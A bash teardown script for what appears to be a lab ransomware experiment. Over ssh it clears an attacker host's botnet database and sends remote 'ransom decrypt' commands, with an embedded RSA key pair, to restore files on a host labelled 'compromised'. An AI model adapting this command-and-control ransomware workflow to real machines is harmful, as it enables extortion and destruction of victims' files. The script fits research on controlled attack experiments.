#!/bin/bash

echo "ending ransomware experiment"

# Incase it recycles commands between experiments
ssh attacker "rm ~/byob/database.db" || true
rm ~/byob/byob/database.db || true
ssh attacker "rm ~/byob/output/*" || true

decrypt_file() {
    file=$1
    ssh attacker "byossh -t 10 compromised ransom decrypt $file MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQBqZ8kpCTmC8/7OXpeSmhqXVCZs68PkjckDGttuHxtQLKka9zbOCmG1RSLU/eOpl6WrikrnzzIWYHmUXppNbfBpG7AhjdE0mH9XCLkqoW5lCy/p4INfKl/B32eFqgsi6vhTyjvdXdgM+kcfy3BdJAp5YPpkC76nETIH4FTcuPbUyfNMwUgW0uRloiiZIl9VSqBRyhy9CMfrXxxPpPC71waOM+UIiicCXyTZDkZc/Un12jcyzfDGCOQdtyWGFc3oQ91xLKGgUHvyTVaGbEWLU5rMPqVpwfQHlrn5R01Mk1bXHQs+29Jd25hXsM/g53el3eXmZ9aNnWlJGppKmPPEo32vAgMBAAE= MIIEoQIBAAKCAQBqZ8kpCTmC8/7OXpeSmhqXVCZs68PkjckDGttuHxtQLKka9zbOCmG1RSLU/eOpl6WrikrnzzIWYHmUXppNbfBpG7AhjdE0mH9XCLkqoW5lCy/p4INfKl/B32eFqgsi6vhTyjvdXdgM+kcfy3BdJAp5YPpkC76nETIH4FTcuPbUyfNMwUgW0uRloiiZIl9VSqBRyhy9CMfrXxxPpPC71waOM+UIiicCXyTZDkZc/Un12jcyzfDGCOQdtyWGFc3oQ91xLKGgUHvyTVaGbEWLU5rMPqVpwfQHlrn5R01Mk1bXHQs+29Jd25hXsM/g53el3eXmZ9aNnWlJGppKmPPEo32vAgMBAAECggEANmKvvaq6W4WMsjxE6qibeMeJEFj8+h/CIzUh/MoncrYxBNhgibVitX0NzaGrMG6TPfdkS9FqP2e2HLCx22ua2o5NWwkaafCb/Yc25WQ3gavTJI4dd5G3+ebPCdGc+Y7xuBoAuSeTGyb9HXIlD2YxeFKqCGK8YrX2RXJSzbI4bw/Utdv1iysoyLFs/lhvjnCGi6nqMQ6Lq7fRbEB0cuIsJpxhYa0wGNQukMdob+t74JExqGbYadNqrUYpVfIfldk/Ie6aMveZBZtGuo9YaIIBMcUxyCupFRZ+Dohp4HqCY0GobFHnMLY3NYOhEnBMcKPFF3PApjLOaYZUWI9beB38OQKBgQCuNVumQwme5bE1B1J8Zf62SNG2QrMp8UBu8nlk8SUxY5VahwJS/ak7IJjSntLSN5Ki11DDQtvKqG1eTdafoY9+0MYfl+1+ROU5ejqHvmkAFFZ5p48vfLriWkoR6UbiZ4x1be6B1uf8/A+Wr6V7HcnjBAeF0Hqten6KVyvlF+FAKwKBgQCcXPoD7soTBbidDvosS7tNqyXUCmWpJff3jIYYraAl0bXXzyaeHas14sChJuQuc5jHc06FmiKtzQxIPTnnRSl9n4IehAc4XMTGoqqbfpfamoLP7H779b31hp8S1IDxwkdpNQiGiCX6oY9GPsg4RfQwp0NLz05WQFbaYMLzbQByjQKBgFQqZVgjhU9mq8HyArElWfVZozBKc2MtMrMnpOzW8OA2u57cIYxVD2EIs6z2nOaBgO/51QQxlh0IWKa6NpozJS/g0AfNkCl0QccOPZ79qJ8oNEtcX/pSabwYYTbcHKof2yWU8il62eRJJ4Lm461iy/pJJRVKjyqnRuGxkfyCGAq3AoGAHrG9voHklyFbYTFseL+RECkVru8vj6nNaIHkXPnQYzwshyW5/fXzAwv1Jm1dA6Vbi2OeOWnNfvKug4vJTxXrlCZ4w4bFaBIF6rxJ42ZRZu9H2IsjTlCqLoVzup2OhmbN3+AyQT5+vhly56YxZaKN0fMzqbETPqk4o3u1KVXvbY0CgYAdFKdMBHchDdGwrf+gjWTCG7qWb4CN06yDS8L/wIEgBxLJ6I7YJExcfWSKiL+3bwYW8bnIY5ZegUqNp4kUkJ3zdsKybsii93trVRZuqbFdCJ2l90iMRHgC17n/mjptrE8dsR6ux020PSB+5QGylD8k50vb/mQFsHirP5P9cMzeNg=="
}


# Decrypt documents
(
    output=$(ssh attacker "byossh find ~/Documents")
    for file in $output; do
        decrypt_file $file
    done
) &

# Decrypt picutres
(
    output=$(ssh attacker "byossh find ~/Pictures")
    for file in $output; do
        decrypt_file $file
    done
) &

# Decrypt videos
(
    output=$(ssh attacker "byossh find ~/Videos")
    for file in $output; do
        decrypt_file $file
    done
) &

# Decrypt downloads
(
    output=$(ssh attacker "byossh find ~/Downloads")
    for file in $output; do
        decrypt_file $file
    done
) &

# Decrypt all text files
(
    output=$(ssh attacker "byossh 'find / | grep .txt'")
    for file in $output; do
        decrypt_file $file
    done
) &

# # Decrypt all python files
# (
#     output=$(ssh attacker "byossh 'find / | grep .py'")
#     for file in $output; do
#         decrypt_file $file
#     done
# ) &

# Decrypt all go files
(
    output=$(ssh attacker "byossh 'find / | grep .go'")
    for file in $output; do
        decrypt_file $file
    done
) &

# Decrypt all go files
(
    output=$(ssh attacker "byossh 'find / | grep .go'")
    for file in $output; do
        decrypt_file $file
    done
) &

# Decrypt all c files
(
    output=$(ssh attacker "byossh 'find / | grep .c'")
    for file in $output; do
        decrypt_file $file
    done
) &

# Decrypt all configs
(
    output=$(ssh attacker "byossh find ~/.config")
    for file in $output; do
        decrypt_file $file
    done
) &


wait


